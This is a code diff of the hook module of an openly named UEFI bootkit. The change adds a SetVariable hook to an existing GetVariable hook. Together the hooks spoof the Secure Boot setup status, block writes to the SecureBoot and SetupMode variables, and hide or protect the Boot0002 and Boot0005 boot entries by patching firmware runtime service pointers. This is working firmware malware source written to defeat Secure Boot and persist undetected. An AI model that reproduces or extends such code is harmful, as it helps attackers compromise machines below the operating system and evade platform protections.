@@ -18,17 +18,20 @@
 
 #include "Utils.h"
 #include "Hooks.h"
+#include "Config/Config.h"
 
 
 /*
     *    src/bootkit/Hooks.c
-    *    Date: 11/27/22
+    *    Date: 12/14/22
     *    Author: @xmmword
 */
 
 
-EFI_GET_VARIABLE OriginalGetVariable;
-EFI_EVENT SetVirtualAddressMapEventVar = NULL;
+EFI_GET_VARIABLE OriginalGetVariable; /* Function pointer that points to the GetVariable service. */
+EFI_SET_VARIABLE OriginalSetVariable; /* Function pointer that points to the SetVariable service. */
+
+EFI_EVENT SetVirtualAddressMapEventVar = NULL; /* Event variable for the SetVirtualAddressMap event. */
 
 /**
  * @brief GetVariable Hook, spoofs the data that will be written back to the output buffer.
@@ -43,6 +46,7 @@ EFI_EVENT SetVirtualAddressMapEventVar = NULL;
 EFI_STATUS EFIAPI GetVariableHook(IN CHAR16 *VariableName, IN EFI_GUID *VendorGuid,
   OUT UINT32 *Attributes, OPTIONAL IN OUT UINTN *DataSize, OUT VOID *Data OPTIONAL)
 {
+#ifdef CONFIG_SPOOF_SECUREBOOT
   if (!StrnCmp(VariableName, L"SetupMode", (sizeof(L"SetupMode") / sizeof(CHAR16)))) {
     *(UINT8 *)Data = (UINT8)0, *DataSize = sizeof(UINT8);
 
@@ -54,19 +58,44 @@ EFI_STATUS EFIAPI GetVariableHook(IN CHAR16 *VariableName, IN EFI_GUID *VendorGu
 
     return EFI_SUCCESS;
   }
+#endif
 
-  if (!StrnCmp(VariableName, L"Boot0001", (sizeof(L"Boot0001") / sizeof(CHAR16)))) {
-    Data = L"pins bootkit was here :)", *DataSize = 27;
-    //const EFI_STATUS GetVariableReturnStatus = OriginalGetVariable(VariableName, VendorGuid, Attributes, DataSize, Data);
-
-    //if (GetVariableReturnStatus != EFI_SUCCESS)
-      //return EFI_BUFFER_TOO_SMALL;
-
-    //Print(L"Buffer: %s\n", (CHAR16 *)Data);
+  if (!StrnCmp(VariableName, L"Boot0002", (sizeof(L"Boot0002") / sizeof(CHAR16))))
     return EFI_SUCCESS;
-  }
+
+  if (!StrnCmp(VariableName, L"Boot0005", (sizeof(L"Boot0005") / sizeof(CHAR16))))
+    return EFI_SUCCESS;
 
   return OriginalGetVariable(VariableName, VendorGuid, Attributes, DataSize, Data);
+}
+
+/**
+ * @brief SetVariable Hook, monitors the data that will be written back to the output buffer.
+ * @param VariableName The UEFI variable name.
+ * @param VendorGuid The GUID.
+ * @param Attributes Attributes.
+ * @param DataSize The size of the data.
+ * @param Data Optional data.
+ * @returns EFI_SUCCESS on success, EFI_FAILURE on failure.
+ */
+
+EFI_STATUS EFIAPI SetVariableHook(IN CHAR16 *VariableName, IN EFI_GUID *VendorGuid,
+  IN UINT32 Attributes, IN UINTN DataSize, IN VOID *Data)
+{
+  /* Prevent the possible modification of our spoofed SecureBoot status. */
+
+#ifdef CONFIG_SPOOF_SECUREBOOT
+  if (!StrnCmp(VariableName, L"SetupMode", (sizeof(L"SetupMode") / sizeof(CHAR16))))
+    return EFI_SUCCESS;
+
+  if (!StrnCmp(VariableName, L"SecureBoot", (sizeof(L"SecureBoot") / sizeof(CHAR16))))
+    return EFI_SUCCESS;
+#endif
+
+  if (!StrnCmp(VariableName, L"Boot0005", (sizeof(L"Boot0005") / sizeof(CHAR16))))
+    return EFI_SUCCESS;
+
+  return OriginalSetVariable(VariableName, VendorGuid, Attributes, DataSize, Data);
 }
 
 /**
@@ -79,7 +108,7 @@ EFI_STATUS EFIAPI GetVariableHook(IN CHAR16 *VariableName, IN EFI_GUID *VendorGu
 
 VOID *HookPointer(VOID **Function, VOID *HookFunction, EFI_TABLE_HEADER *Header) {
   VOID *CachedFunction = *Function;
-  
+
   CONST EFI_TPL RaiseReturnStatus = gBS->RaiseTPL(TPL_HIGH_LEVEL);
   Header->CRC32 = 0;
 
@@ -99,6 +128,7 @@ VOID *HookPointer(VOID **Function, VOID *HookFunction, EFI_TABLE_HEADER *Header)
 
 VOID EFIAPI VMapEvent(EFI_EVENT EfiEvent, VOID *Context) {
   gRT->ConvertPointer(0, (VOID **)&OriginalGetVariable);
+  gRT->ConvertPointer(0, (VOID **)&OriginalSetVariable);
 
   SetVirtualAddressMapEventVar = NULL;
 }
